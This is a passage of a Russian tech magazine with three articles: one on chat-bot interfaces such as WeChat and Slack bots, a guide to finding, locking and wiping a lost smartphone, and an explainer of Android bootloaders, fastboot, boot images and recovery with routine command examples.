альную сеть в заменитель интернета если не для всех, то для изрядной доли
своих пользователей. Для Tencent же совершенно естественно ставить во гла-
ву угла мессенджеры.
  WeChat сочетает черты мессенджера и соцсети: в нем можно общаться на-
прямую, как в Google Talk или ICQ, а можно публиковать общедоступные сооб-
щения для подписчиков, как в Twitter или Facebook. Знаменитости и известные
китайские компании, как правило, имеют представительство в WeChat.
  Но самое необычное в WeChat — это боты. Сама по себе идея чат-бота
не нова, но тут все дело в масштабах. Боты WeChat — это очень серьезно. По
сути, в Китае они заняли ту же нишу, которая в других странах отведена для мо-
бильных приложений или сайтов. О таком успехе своих продуктов в Google или
Facebook могут только мечтать.
  В WeChat есть боты, работающие на государственные организации и на
крупные корпорации, есть боты-торговцы и боты-банкиры. С их помощью мож-
но сделать все: продлить визу, совершить покупку, записаться на прием к вра-
чу, узнать новости и многое другое.
  Общение с программой в данном случае — это действительно общение
в самом буквальном смысле этого слова. Для управления банковским счетом
или обращения в магазин используется тот же интерфейс, что и для разговоров
с приятелями. Просто в данном случае на запросы отвечает машина. Впрочем,
если понадобится, к разговору всегда может подключиться человек-оператор.
   Это удобно для пользователей: им не нужно устанавливать отдельные при-
ложения и разбираться в их интерфейсах. Это удобно и для разработчиков:
боты куда проще и дешевле, чем приложения и даже сайты. К тому же не нужно
думать о поддержке различных мобильных платформ — это забота WeChat.
   Чтобы упростить взаимодействие с ботами на мобильных устройствах,
WeChat позволяет им отображать в нижней части чата готовые варианты от-
вета, которые можно выбрать одним кликом (реализацию той же идеи можно
встретить в сообщениях Apple Watch и в мессенджере Telegram).
   Чат в качестве пользовательского интерфейса стал в Китае общим местом,
и теперь такой подход копируют даже приложения, не имеющие ничего общего
ни с WeChat, ни с чатами как таковыми. У них нет выбора. Чат — это именно то,
чего ждут от них пользователи.

НЕ НАДО СЛОВ
Диалоговые интерфейсы никогда не были столь массовыми, но они существо-
вали задолго до ботов WeChat. Более того, они предшествовали даже привыч-
ному для нас графическому интерфейсу пользователя, но давно ему проигра-
ли. И не просто так. Для проигрыша были все основания.
   Удобство диалогового интерфейса напрямую зависит от того, до какой
степени компьютер понимает естественный язык. Поскольку до недавних пор
с пониманием было совсем худо, пользователь должен был сам позаботиться
о том, чтобы до машины дошло, чего от нее хотят.
  Проигрыш не привел к полному исчезновению диалоговых интерфейсов, но
надолго вытеснил их на обочину. Чаще всего их применяли для передачи ко-
манд удаленным программам: для взаимодействия с серверами IRC, подпи-
ски на почтовые рассылки или, к примеру, управления СМС-сервисами (да, это
тоже диалоговый интерфейс, пусть и очень примитивный).
   Другой пример незаметного диалогового интерфейса — поисковые систе-
мы, особенно в тех случаях, когда выдаваемые ими результаты — это не впол-
не поиск. Например, известно, что, если отправить Google математическое
выражение, он подсчитает его результат. Яндекс можно заставить конверти-
ровать единицы измерения, показывать точное время или нужный цвет пря-
мо в выдаче (на яндексовском жаргоне такие микроприложения называются
«колдунщики»).
  В начале двухтысячных американская компания ActiveBuddy разработа-
ла чат-бот под названием SmarterChild для мессенджеров AIM и Windows Live
Messenger. В отличие от большинства диалоговых интерфейсов, существовав-
ших до него, SmarterChild, во-первых, не нуждался в знании специального язы-
ка запросов, а во-вторых, пытался вести настолько живую беседу, насколько
это возможно без настоящего искусственного интеллекта.
  С помощью SmarterChild можно было получить последние новости, узнать
погоду в разных точках страны, выяснить, когда начинается нужный сеанс в бли-
жайшем кинотеатре, проследить за итогами спортивного матча и многое дру-
гое. Кроме того, бот пытался отвечать на произвольные вопросы и даже шутить.
В этом смысле он был непосредственным предшественником Siri.
   SmarterChild требовал знания английского и работал в сетях, которые не
особенно известны в России, поэтому здесь о нем почти не знают, но у себя
на родине он пользовался бешеной популярностью. «Когда я впервые услы-
шал о разработке Siri, у SmarterChild было уже 10 миллионов пользователей, —
вспоминал в одном из интервью инвестор Шоун Кэролан из компании Menlo
Ventures. — Он обрабатывал миллиард запросов в сутки. Было ясно, куда дует
ветер». Menlo Ventures вложила деньги в разработку Siri и не прогадала. Спустя
несколько лет технологию приобрела Apple.
   После появления современных смартфонов не заметить, куда дует ветер,
стало еще труднее. Уведомления iOS и Android имеют много общего с чатом,
причем участники этого чата зачастую не люди, а приложения. А в последних
версиях этих мобильных платформ можно не только читать уведомления, но
и взаимодействовать с ними. Отсюда — один шаг до диалоговых интерфейсов
в стиле WeChat.

СОВРЕМЕННЫЙ РАЗГОВОР
Самый горячий стартап 2014 года называется Slack. За ним стоит один из осно-
вателей известного фотосервиса Flickr Стюарт Баттерфильд. Slack представ-
ляет собой чат для рабочих групп. Компании оплачивают его для того, чтобы
сотрудники обсуждали рабочие вопросы, обменивались документами — сло-
вом, делали все то, для чего обычно используют электронную почту, но лучше,
быстрее и удобнее.
   Боты с самого начала были видной частью Slack. Каждая команда сразу же
получает собственного слекбота, которого можно научить реагировать на клю-
чевые слова. Это, впрочем, лишь начало. Slack можно интегрировать с уймой
популярных онлайновых сервисов — от Github до Asana. Каждая интеграция —
тоже своего рода бот. В простейшем случае они будут уведомлять о событиях,
за которыми им поручили наблюдать. Например, Github сообщит в чате о слу-
чившихся коммитах в интересующем репозитории.
   Существуют варианты и посложнее. У Slack есть программный интерфейс
для разработки специализированных ботов, и пользователи вовсю эксплуати-
руют эту возможность. На сайте www.slackbotlist.com перечислены десятки бо-
тов для Slack разного назначения. Некоторые из них по своей сложности вполне
способны соперничать с более традиционными мобильными приложениями.
   Вот характерный пример — Nikabot. По-
сле подключения этот бот регулярно выяс-
няет у членов команды, чем каждый из них
занимается в данный момент. Собранную
информацию «Ника» переводит в наглядную
форму, генерирует отчеты и предоставляет
менеджеру. Создатели Nikabot явно надеют-
ся превратить свою разработку в бизнес —
у сервиса есть платный тарифный план.
   Другой бот для Slack с серьезными претензиями называется Ask Nestor.
«Нестор» позволяет обращаться к нескольким популярным онлайновым сер-
висам при помощи текстовых запросов, сформулированных на относительно
естественном английском языке — в стиле Siri. Бота, к примеру, можно попро-
сить подогнать такси Uber по нужному адресу, подсчитать статистику платежей
через Stripe, найти ближайший ресторан в Yelp или отправить жалобу на баг
в Github (это не полный список).
   Slack дает плодотворную среду для развития ботов, но можно обойтись и без
него. Их можно приспособить к любому сервису сообщений, даже к простому
СМС. В начале года немало шума наделал Magic — стартап, принимающий по
СМС заказы любого рода (в разумных, конечно, пределах). Строго говоря, это
не бот, а, скорее, «киборг» — запросы обрабатывают вполне живые операто-
ры. Эффект, впрочем, тот же: на каждый запрос тут же приходит ответ. Вот при-
мер такого диалога.

— Мне нужно слетать в Бостон в следующую пятницу.
                       — Самый дешевый перелет или минимум пересадок?
— Подешевле.
                                  — ОK, можно за 351 доллар в 11 утра
                                      из аэропорта Сан-Хосе. Годится?
— Да.
                               — Билет забронирован, проверьте почту.

Другой пример:

— Мне нужны бананы, йогурт, туалетная бумага,
бумажные полотенца, полкило мяса для гамбургеров
и пива.
                                                             — Когда?
— Сегодня днем.
                                 — Могу заказать в Instacart доставку
                                      из магазина Safeway до трех дня
                                                      за 65 долларов.
— Окей.
                                                   — Будет исполнено.

Более технологичный пример — сервис-копилка Digit. Он подключается к бан-
ковскому счету и внимательно следит за выполняемыми операциями, пытаясь
уловить закономерности. Поняв, сколько его пользователь обычно тратит, на-
сколько быстро и зачем, он начинает время от времени перекладывать на от-
дельный счет небольшие суммы, которые, по его прикидкам, вряд ли понадо-
бятся для текущих расходов.
   После регистрации и настройки счета, для которых требуется браузер, взаи-
модействие с Digit происходит исключительно по СМС. Раз в сутки он сообщает
пользователю, сколько денег на счете. В ответ можно попросить Digit прислать
статистику по накопленным деньгам, список последних операций или извлечь
деньги из копилки. Это необычно, но пока что сервис обходится без приложе-
ния и надеется, что СМС им хватит еще надолго.
   Можно, конечно, сказать, что все это мы уже видели. Трудно поспорить, но
тут вот какое дело: мы видели это на другом уровне развития. Интерфейсы Palm
OS образца 2000 года и iOS 8 на самом базовом уровне тоже очень похожи, но
только слепой скажет, что пятнадцать лет были потрачены впустую. То же и тут: за
диалоговые интерфейсы впервые за пару десятилетий взялись по-настоящему.
  В истории компьютерной техники немало развилок, глядя на которые за-
даешься вопросом: а что, если бы в свое время выбор был сделан в пользу
другого пути? Обычно можно только гадать. Диалоговые интерфейсы — ред-
кий случай, когда к оставленному позади решению удалось вернуться на новой
стадии развития, с новыми технологиями и новыми возможностями. И скорее
всего, не зря.
X-Mobile
ПО СЛЕДАМ
СМАРТФОНАИЩЕМ, БЛОКИРУЕМ И СТИРАЕМ
ПОТЕРЯННЫЙ ДЕВАЙС


                       Все мы люди и можем поте-
                           рять что-то ценное в самое
                        неподходящее время. Поте-
                         ря гаджета может обернуть-
                          ся не только финансовыми
                        проблемами, но и угоном
                          электронного кошелька, ак-
                           каунтов в социальных се-
                             тях или даже шантажом.
                        Поэтому в голове должен
                         быть четкий план действий
                         на случай пропажи девайса.
Итак, смартфон утерян или украден. Внутри куча личной
информации, а стоимость самого гаджета измеряется
десятками тысяч рублей. Что делать?

ШАГ 1. БЛОКИРУЕМ, ИЩЕМ, СТИРАЕМ                  Денис Погребной
Любую защиту можно обойти, поэтому первое, что мы          denis2371@gmail.com
должны сделать после потери или кражи смартфона, —
это заблокировать его и попробовать отследить последнее местоположение.
А в случае чего просто стереть все данные из памяти. Все это можно сделать
как с помощью встроенных в ОС средств, так и используя специальный софт
типа Prey и других антиворов. Первый вариант доступен всегда, даже если ты
ничего не устанавливал на смартфон, поэтому рассмотрим именно его.

Android
1. Открываем в браузере Device Manager.
2. Выбираем нужное устройство в списке. Нажимаем маленькую иконку опре-
   деления местоположения. Если смартфон «в сети» — его положение поя-
   вится на карте.


                                                                 Смартфон
                                                                       найден!
3. С помощью команды «Блокировать» ставим на смартфон цифровой пароль
   и вводим сообщение, которое увидит вор. Также указываем номер, на кото-
  рый вор сможет позвонить, чтобы вернуть смартфон (оксюморон!).

При помощи команды «Очистить» со смартфона можно удалить все данные
(причем если в данный момент смартфон не подключен к интернету, операция
будет выполнена, как только интернет появится). Однако имей в виду, что карта
памяти останется нетронутой, благо кроме фоток да кеша игр на ней нечего
искать. Два лайфхака:
•  все описанные операции можно выполнить с другого смартфона/планшета
   с помощью приложения (сюрприз!) Device Manager;
•  недавно Google запустила сервис Timeline, который показывает все места,
   где бывали твои устройства (вместе с маршрутами передвижения).





Устанавливаем пароль
на экран блокировки
iOS
1. Открываем  страницу  поиска
   iPhone или запускаем приложе-
   ние «Найти iPhone» на другом
   устройстве iOS.
2. Выбираем устройство и видим
   его геопозицию на карте.
3. Включаем  «Режим  пропажи».
   Благодаря ему ты сможешь уда-
   ленно  заблокировать  устрой-
   ство с помощью четырехзнач-
   ного пароля, а также отобразить
   на экране блокировки настра-
   иваемое сообщение с номе-
  ром телефона, чтобы оставить
   злоумышленнику  возможность
   сдаться.

Таким же образом можно удалить
с устройства все данные. Но после
этой процедуры определить гео-
позицию с помощью программы
«Найти iPhone» будет невозможно.
Зато функция «Блокировка акти-
вации» (Activation Lock) останется
включенной, а это значит, что никто
не сможет использовать твой iPhone
до тех пор, пока не активирует его
с помощью Apple ID. Activation Lock
                                      Экран заблокированного устройстваавтоматически отключается после
отвязки смартфона от Apple ID.

Windows Phone
1. Переходим по адресу устройства Microsoft.
2. Выбираем телефон и щелкаем пункт «Поиск телефона». Видим карту.
3. Жмем «Заблокировать» и следуем инструкциям. Если на телефоне еще
   не задан пароль, то потребуется ввести его. Он будет использоваться
   для разблокировки.

Кстати, я советую заранее включить службу «Поиск телефона». Она будет со-
хранять местоположения каждые несколько часов, чтобы было легче обнару-
жить телефон. Для ее активации в настройках поставь галочку возле пункта
«Поиск телефона».





Включаем «Режим пропажи»

Сим-карта
Звоним сотовому оператору и просим его заблокировать сим-карту. Опера-
торы обычно не сразу блокируют симку, а некоторое время посылают на нее
сообщения с просьбой вернуть украденный телефон.

ШАГ 2. ОТКЛЮЧАЕМСЯ ОТ ОБЛАКОВ
Современные смартфоны полностью завязаны на облака. Google, iCloud,
Dropbox, Facebook, «Вконтакте», Twitter — все это облачные сервисы, и мы ис-
пользуем их каждый день. Само собой, попади смартфон в руки другого чело-
века, он автоматически получит доступ чуть ли не ко всей твоей жизни, начи-
ная от почты и календаря и заканчивая личными файлами из Dropbox. Однако
в большинстве случаев нам не составит труда отвязать смартфон от облаков,
и для этого даже не придется менять пароли.
  В случае с Android первое облако, от которого необходимо отключиться, —
это, конечно же, Google. Для этого открой страницу приложений, связанных
с аккаунтом, кликни по названию потерянного/украденного устройства и нажми
«Удалить». Это действие полностью отключит девайс от Google, а значит, от мар-
кета, Gmail, календаря и кучи других сервисов компании. На смартфоне останут-
ся только закешированные данные (почта, например). При этом Device Manager
будет продолжать видеть устройство и показывать его местоположение.
   Что касается других сервисов, то я подготовил небольшой список с ин-
струкциями.
•  Dropbox. Открываем страницу безопасности. На вкладках «Устройства»
   и «Подсоединенные приложения» отключаем потерянное устройство и при-
   ложения, которые были в нем установлены.
•  «Вконтакте». Идем в настройки приложений, далее находим нужное при-
   ложение и нажимаем «Убрать».
•  Twitter. Идем в список подключенных приложений, нажимаем «Закрыть до-
   ступ» возле нужных приложений.
•  Facebook. Открываем список приложений, нажимаем «Закончить дей-
   ствие» там, где нужно.
•  Skype. Меняем пароль, другого выхода нет.
•  Instagram. Также меняем пароль.
• «Одноклассники». Отключаем все устройства разом. Да, только все сразу.
•  Viber. Быстрой и удобной удаленной блокировки, очистки сообщений в дан-
  ном мессенджере не предусмотрено. Для этого придется обратиться в их
   службу поддержки и ждать ответа (и блокировки) довольно долгое время.
   Удобный мессенджер, не правда ли?
•  Telegram. Если веб-клиент активирован через номер потерянного смартфона
   и ты не чистил cooke, то, считай, повезло. Можно заблокировать краденый де-
   вайс через браузер с компьютера. Для этого открой сайт Telegram, далее «На-
   стройки -> Активные сеансы -> Завершить сеанс» возле нужного устройства.
• WhatsApp. Отвалится сам через некоторое время после смены/блокиров-
   ки сим-карты.

Стоит отметить, что все это — защита именно от входа в аккаунт с устройства.
Ни один из упомянутых сервисов не использует пароль для входа с помощью
мобильного приложения. Вместо этого каждому устройству выдается токен, ко-
торый в большинстве случаев даст доступ только с данного девайса. Сам пароль
останется в целости и сохранности. Почти все остальные известные сервисы
работают так же, не говоря уже об электронных кошельках и мобильных банках.
Хотя сменить пароль или даже банковскую карту, конечно же, будет не лишним.

ШАГ 3. ПИШЕМ ЗАЯВУ, ИЩЕМ НА БАРАХОЛКАХ
Если найти телефон не удалось или выяснилось, что он находится в руках от-
кровенной гопоты, — обращаемся в полицию и готовимся долго стоять в оче-
редях и писать множество заявлений. Способ не ахти какой эффективный,
а точнее практически неэффективный, но чем черт не шутит. Бумажки потре-
буются следующие:
•  паспорт;
•  оригинальная упаковка с номером IMEI (на бумажке этот номер, конечно,
   не примут);
•  чек, подтверждающий покупку.

Лайфхак 1: если в заявлении написать «утеря», а не «кража», то немного со-
кратится срок обработки бумаг и передачи заявления в СБ оператора связи.
Лайфак 2: звони и спрашивай, как идет дело, иначе на него просто забьют.

Правильным будет сходить по точкам продаж бэушных телефонов. Также стоит
поискать телефон на барахолках, например Avito, а также в местных газетах
объявлений и подобных местах. На всякий случай оставляем данные своего
устройства на сайтах, позволяющих потенциальным покупателям проверить
телефоны по IMEI на криминальное происхождение. Популярный сборник IMEI
ворованных телефонов.
  На этом, в общем-то, все.

А СРАБОТАЮТ ЛИ СРЕДСТВА
ЗАЩИТЫ?
ОK, допустим, отыскать телефон не уда-
лось. Но мы же ставили на экран блоки-
ровки PIN-код, в смартфоне есть сканер
отпечатков пальцев, да и производитель
наверняка позаботился о наших данных.
Что ж, попробуем разобраться, поможет
ли это.

PIN-код
В большинстве случаев пин-код и графи-
ческий ключ на 99% гарантируют сохран-
ность данных, но только если речь идет
об iOS, Windows Phone или Android-ап-
парате c заблокированным загрузчиком,
для которого не найдено средств обхода
защиты. В этом случае, даже если нашед-
ший твой гуглофон человек разблоки-
рует загрузчик легальными средствами,
смартфон будет автоматически сброшен
до заводских настроек. С другой сторо-
ны, если загрузчик уже был разблокиро-
ван, то никакая система защиты не по-
может. Снять пин-код через кастомный   Включаем PIN-код
recovery — дело двух минут.
Сторонний антивор
Проблема всех сторонних антиворов в том, что почти все они беззащитны про-
тив аппаратного сброса настроек или перепрошивки. Из общей массы выде-
ляется разве что специальная версия Avast Anti-Theft для рутованных смартфо-
нов. Помимо кучи функций, он обладает колоссальной живучестью и не только
прописывает себя в системный раздел под безобидным именем (чтобы вы-
держать сброс до заводских настроек), но и помещает скрипт для восстанов-
ления самого себя в /etc/addon.d, откуда
кастомные recovery автоматически запу-
скают скрипты до/после перепрошивки.
Фактически это значит, что даже если че-
ловек установит любую другую прошивку
через кастомный recovery, то антивор все
равно останется на месте.

Системы распознавания
отпечатков пальцев
Может показаться, что система защиты
на основе отпечатков пальцев практи-
чески идеальна в случае потери/кражи
смартфона. Вор или нашедший смартфон
вряд ли тебя знает и уж точно не может
иметь доступ к твоим пальцам. Однако
есть и другая сторона медали. На конфе-
ренции Black Hat в Лас-Вегасе Тао Вей (Tao
Wei) и Юйлун Чжан (Yulong Zhang) из ком-
пании FireEye показали, что сканеры от-
печатков пальцев на Android-устройствах
уязвимы к дампу самого отпечатка.
   Фактически это означает, что если
кто-то «вскроет» твой утерянный смарт-
                                                    Avast Anti-Theft собственной персонойфон, то сможет завладеть не только тво-                                             (Прописываем Avast в системный
ими данными, но и отпечатками, а в отли-                                                 раздел)
чие от паролей их ты уже не поменяешь.
Проблема существует в HTC One Max и Samsung Galaxy S5, но отсутствует
в iPhone — он хранит изображение в зашифрованном виде.

Sony My Xperia Theft Protection (MXTP)
Последние модели Sony Xperia, начиная с Xperia Z3+, M4 Aqua, C4, Z4 Tablet
имеют фирменную защиту My Xperia Theft Protection. Она интегрирована в сам
загрузчик и в случае активации намертво блокирует смартфон. Даже если по-
сле этого прошить смартфон с помощью PC Companion или FlashTool, при вклю-
чении все равно появится запрос пароля от учетной записи Google. Активи-
ровать ее можно в настройках безопасности в разделе «Защита при помощи
my Xperia». Но не пытайся включить функцию после разблокировки загрузчика,
это превратит смартфон в кирпич.

Activation Lock от Apple, Reactivation Lock от Samsung, «Защита
от сброса» в Windows Phone
•  Activation Lock — это дополнительная опция к Find My iPhone, которая
связывает устройство с учетной записью владельца. Нововведение в iOS 7.
Принцип действия прост: даже после сброса до заводских настроек iPhone
не удастся активировать без Apple ID и пароля предыдущего владельца (чем
очень часто пользуются продавцы-вымогатели).
•  Reactivation Lock — очень похожая функция от Samsung. Она доступна
на всех флагманах компании, начиная с Galaxy Note 3 и Galaxy S5. После ее
включения аппараты будут требовать пароль для повторной активации аппа-
рата после отката к заводским настройкам или даже для начала самого отката
(в зависимости от настроек). Специально для Reactivation Lock в смартфонах
выделена особая область памяти, защищенная от аппаратного сброса на-
строек.
• Защита от сброса — система защиты, схожая по функционалу с описан-
   ными. По задумке Microsoft она не даст злоумышленнику обойти пароль
   путем hard reset’а и/или последующего запуска новой кастомной прошивки
   или понижения версии Windows Phone. Доступна начиная с Windows Phone
   8.1 GDR2 (Update 2) и выше. Находится в «Настройки -> Поиск телефона».
• Qualcomm SafeSwitch — это Kill Switch, работающий на аппаратном уровне
   и активируемый во время загрузки устройства. Как утверждает Qualcomm,
   система делает смартфон максимально устойчивым для взлома. Доступна
   начиная со Snapdragon 810.

ВЫВОДЫ
Современные смартфоны могут содержать внутри себя настолько много цен-
ной конфиденциальной информации, что иногда их крадут именно из-за нее.
Но системы защиты тоже развиваются и предоставляют гораздо больше воз-
можностей, чем раньше. Главное — не забывай ими пользоваться, если доро-
жишь своим девайсом или данными в нем. На первый взгляд может показаться
неудобным настраивать «ненужные» функции, но именно из-за пренебреже-
ния простыми правилами обычно и влипают в очень неприятные ситуации.
 X-Mobile
КОПАЕМ




                                                                              Евгений Зобнин
                                                                                                          androidstreet.netГЛУБЖЕКАК РАБОТАЮТ МЕХАНИЗМЫ ПРОШИВКИ,
РУТИНГА И ВОССТАНОВЛЕНИЯ ANDROID

 Тот, кто когда-либо прошивал свой смартфон или хотя бы разбло-
 кировал загрузчик, наверняка имел дело если не с инструментами
 командной строки, то хотя бы со специальными графическими при-
 ложениями для Windows, которые делают всю магию. Но как на са-
 мом деле происходит разблокировка загрузчика, установка новой
 прошивки или сброс до заводских настроек? Что скрыто, так ска-
 зать, под капотом?
Я расскажу, как это все работает изнутри, и поясню происходящее на при-
мерах. Для простоты и лучшего понимания все повествование будет ве-
стись в том же порядке, в котором компоненты получают управление на ре-
альном устройстве: ROM -> загрузчик aboot -> ядро -> система Android.
Плюс, конечно же, recovery, который может быть запущен загрузчиком вме-
сто Android.

ABOOT, FASTBOOT И TAMPER-БИТ
Если не брать в расчет небольшой код инициализации, располагающий-
ся в ROM-памяти устройства и специфичный для каждого чипа, то за-
грузка Android начинается с aboot. Это стандартный загрузчик устройств
на базе Android, разработкой которого занимается сама Google. Задача
aboot — выполнить первичную инициализацию железа и передать управ-
ление либо коду, расположенному в разделе boot (это ядро Linux), либо,
если юзер включил смартфон с зажатой клавишей уменьшения громко-
сти, в recovery.
   Ключевая особенность aboot в том, что это модульный загрузчик и к нему
при сборке можно подключать разные сопрограммы, каждая из которых будет
исполняться в отдельном потоке (что делает aboot миниатюрной ОС). Одна
из таких сопрограмм — fastboot, реализация протокола и механизмов для за-
писи разделов внутренней NAND-памяти. В среде энтузиастов fastboot обыч-
но используется для установки кастомного recovery. Для этого достаточно
включить смартфон с зажатыми клавишами управления громкостью (на боль-
шинстве смартфонов), затем с их же помощью выбрать в меню пункт Fastboot,
подключить смартфон с помощью USB-кабеля к компу и выполнить такую ко-
манду (она входит в комплект Android SDK):

$ fastboot flash boot образ-recovery.img

Причем recovery можно даже не прошивать, а запустить прямо с компа (эту
функцию, кстати, использует инструмент CF-Auto-Root, но о нем позже):

$ fastboot boot образ-recovery.img

Однако эти команды не сработают, если загрузчик залочен. Чтобы его раз-
блокировать, на смартфонах линейки Nexus и OnePlus достаточно выполнить
такую команду (все, что начинается с oem, — это команды, встроенные произ-
водителем смартфона):

$ fastboot oem unlock
Справка по командам fastboot


Что делает эта команда? В нексусах она выполняет сброс до заводских настро-
ек и записывает один бит в специальный раздел в памяти устройства, служа-
щий индикатором разлочки для самого загрузчика. В Nexus 4 и 5 это раздел
misc и адрес 16400, в других нексусах это может быть раздел param (Nexus 10)
или даже aboot (Nexus 7/2013 и OnePlus One). Начиная с Nexus 6 и 9, Google на-
вела в этом бардаке порядок и ввела понятие Persistent-раздела для хранения
не зависящих от Android настроек. Имя этого раздела хранится в системной
переменной ro.frp.pst, и его в любой момент можно получить с помощью такой
команды (запускать на самом устройстве):

$ getprop ro.frp.pst

Как видно, все довольно просто, и, если говорить о нексусах, здесь «залочен-
ный загрузчик» — это просто защита от дурака (собственно, как и должно быть
в референсных смартфонах). Загрузчики в обычных смартфонах разработки
Samsung, HTC, LG, Motorola и других серьезных контор защищены гораздо луч-
ше, и с помощью команды oem unlock или записи бита по определенному адре-
су их не вскроешь. Сам бит записывается в недоступную пользователю память,
а разблокировка возможна только с помощью цифрового ключа, полученного
на сайте производителя (ну или взлома загрузчика, если это возможно).
  И в нексусах, и в смартфонах других компаний при разблокировке загруз-
чика всегда устанавливается так называемый tamper-бит. Сервисные центры
смотрят именно на него, решая, признать ли случай гарантийным: даже если
впоследствии загрузчик был заблокирован, tamper-бит однозначно свиде-
тельствует о факте разблокировки. Однако иногда этот бит можно сбросить.
В нексусах все решается опять же простой записью бита по нужному адресу
в нужный раздел, в других смартфонах это либо вообще невозможно сделать,
либо приходится использовать специальные инструменты типа приложения
Triangle Away (для Samsung’ов без KNOX).





Выясняем, установлен ли загрузчиком tamper-бит

Чтобы окончательно тебя запутать, скажу, что производители часто использу-
ют модульную архитектуру aboot для встраивания в него собственных средств
прошивки и управления, работающих совместно с fastboot или даже вместо
него. Наиболее яркий пример — это Odin в смартфонах Samsung. А некоторые
производители идут еще дальше и вообще отказываются от aboot, заменяя
его собственным или сторонним загрузчиком.





Исследуем таблицу разделов планшета на базе Rockchip 3066
   Например, в чипах Allwinner опенсорсный загрузчик uboot, который принято
использовать в разного рода встраиваемых системах, например для роуте-
ров. У MTK загрузчик собственного изготовления, разделенный на два компо-
нента: preloader.bin, с которым работают фирменные утилиты прошивки SP
Tools, и lk.bin, отвечающий за инициализацию оборудования. HTC использует
загрузчик hboot, не так уж и сильно отличающийся от aboot. У Rockchip так-
же свой собственный загрузчик, интересная особенность которого в том, что
инфа о разметке NAND-памяти не вшита в него намертво, а находится в нача-
ле самой памяти. Благодаря этому изменить размеры разделов в устройствах
на базе Rockchip проще простого.
  С загрузчиками закончим и перейдем к следующему компоненту загрузки.

РАЗДЕЛ BOOT И ЯДРО
Если во время включения устройства ты не зажимал клавишу уменьшения гром-
кости либо не перезагружал смартфон в режим recovery намеренно (например,
с помощью расширенного меню перезагрузки в кастомных прошивках), на по-
следнем этапе своей работы aboot загружает в память устройства ядро Linux
и RAM-диск из раздела boot, а после этого передает управление ядру.
  Сам раздел boot не содержит никакой файловой системы, а представляет
собой сжатые с помощью gzip и записанные друг за другом ядро и RAM-диск,
предваренные небольшим заголовком размером в два килобайта (он содер-
жит опции загрузки ядра, а также адреса расположения образов и другую ин-
формацию). RAM-диск, в свою очередь, представляет собой небольшую вир-
туальную файловую систему, содержащую набор каталогов, к которым Android
подключит файловые системы других разделов (system, data, sdcard), а так-
же систему и скрипт инициализации и init.rc. RAM-диск загружается прямо
в оперативку и продолжает существовать все время, пока смартфон включен.
   Благодаря простой структуре образ раздела boot (boot.img) довольно легко
распаковать. Это можно сделать даже с помощью HEX-редактора, но проще
воспользоваться инструментом imgtool. Пример для Linux (x86_64):

$ imgtool.ELF64 boot.img extract
$ cd extracted
$ mkdir ramdisk_ext
$ cd ramdisk_ext
$ gunzip -c ../ramdisk | cpio -i

Запакованные ядро и RAM-диск окажутся в каталоге extracted, а содержи-
мое RAM-диска — в подкаталоге ramdisk_ext. Это в идеале. На самом деле,
как и в случае с загрузчиком, никакого стандарта для формата раздела boot
нет, и производитель может проявить фантазию. Нередко ядро и RAM-диск
располагаются на разных разделах. Такую конфигурацию можно найти в ста-
рых моделях Samsung и устройствах на базе Rockchip.
   Тем не менее в 95% формат раздела boot стандартный, и если ты когда-ли-
бо прошивал на свой аппарат кастомное ядро, то наверняка внутри ZIP-архива
с ядром был именно образ boot.img, так что вместе с ядром ты прошивал так-
же и RAM-диск. Когда ты это делал, тебе приходилось быть осторожным, ведь
RAM-диск стоковой прошивки отличается от RAM-диска того же CyanogenMod.
Прошив ядро для AOSP в CyanogenMod, ты мог получить bootloop и много дру-
гих неприятностей.
   Чтобы  обойти  эту  проблему,  разработчик  CyanogenMod  и  автор
ClockworkMod Recovery Кушик Дутта (Koushik Dutta, или Koush) создал систему
AnyKernel, которая позволяет устанавливать ядра отдельно от RAM-диска (пу-
тем пересборки раздела boot на лету). Сегодня ее используют многие разра-
ботчики кастомных ядер, но далеко не все. Так что перед прошивкой ядра ре-
комендую либо найти его версию для того кастома, который установлен у тебя,
либо убедиться, что оно использует механизм AnyKernel.
   Какое бы ядро ты ни выбрал, тебе в любом случае понадобится кастомный
recovery для его установки.

RECOVERY, EDIFY И AROMA INSTALLER
Обнаружив зажатую клавишу уменьшения громкости, aboot делает почти то же
самое, что и при обычной загрузке, но использует вместо boot раздел recovery.
Разделы идентичны по своему формату и зачастую включают в себя одно и то
же ядро, однако содержимое RAM-диска существенно отличается. Если в слу-
чае с разделом boot назначение RAM-диска — создать начальные условия
для дальнейшей загрузки системы, то recovery — это мини-ОС, способная ра-
ботать обособленно.
   Стоковый recovery очень прост. Все, что содержит его RAM-диск, — это ис-
полняемый файл /sbin/recovery и (не всегда) набор фоновых изображений
в каталоге /res или любом другом. При загрузке ядро Linux запускает /sbin/
recovery, а тот выводит на экран простенькое меню, с помощью которого мож-
но установить прошивку, подписанную цифровым ключом производителя, или
произвести сброс до заводских настроек.
   Кастомные recovery намного сложнее. Это уже не просто меню с фоновым
рисунком, но целая операционная система, способная устанавливать какие
угодно прошивки, делать бэкап, форматировать разделы и многое другое.
Современные версии TWRP так и вообще поддерживают управление с помо-
щью тач-интерфейса, сменные шкурки, полностью изменяющие внешний вид
recovery, пароль для входа и эмулятор терминала вместе с экранной клави-
атурой. Плюс ко всему кастомные recovery включают в себя BusyBox (набор
утилит командной строки Linux) и сервер ADB, работающий с правами root.
Так что режим recovery очень удобно использовать для отладки и таких опера-
ций, как, скажем, дамп разделов. Например, раздела boot (пример для чипов
Qualcomm):

$ adb shell dd if=/dev/block/platform/msm_sdcc.1/by-name/boot
    of=/sdcard/boot.img

Но главная задача recovery — это, конечно же, установка прошивок. Точнее,
она была бы главной задачей, если бы в recovery была такая функция. На са-
мом деле все, что делает recovery, когда ты нажимаешь «Install ZIP...» и выбира-
ешь прошивку, — распаковывает ZIP-файл (обычно в раздел cache) и запуска-
ет файл /META-INF/com/google/android/update-binary внутри него. Именно
update-binary выполняет установку прошивки, руководствуясь инструкциями
из файла updater-script (он лежит рядом).
  Сами инструкции написаны на языке Edify, включающем в себя набор ко-
манд, которые могут понадобиться при установке: mount, unmount, package_
extract_file, symlink, run_program и другие. Мы не будем обсуждать здесь все
эти команды, они достаточно просты, и, чтобы ознакомиться с ними, доста-
точно распаковать любую прошивку и открыть updater-script в текстовом ре-
дакторе. Скажу лишь, что обычно такие файлы генерируются автоматически
при сборке системы из исходников и только авторы узкоспециализированных
прошивок (содержащих только ядро, например) пишут их самостоятельно.





Фрагмент updater-script из CyanogenMod 12.1
Recovery не накладывает никаких ограничений на файл update-binary — глав-
ное, чтобы его можно было запустить. Это дает производителям возможность
использовать вместо него любое приложение, способное запуститься поверх
ядра Linux. Совсем не обязательно, чтобы оно вообще выполняло установку
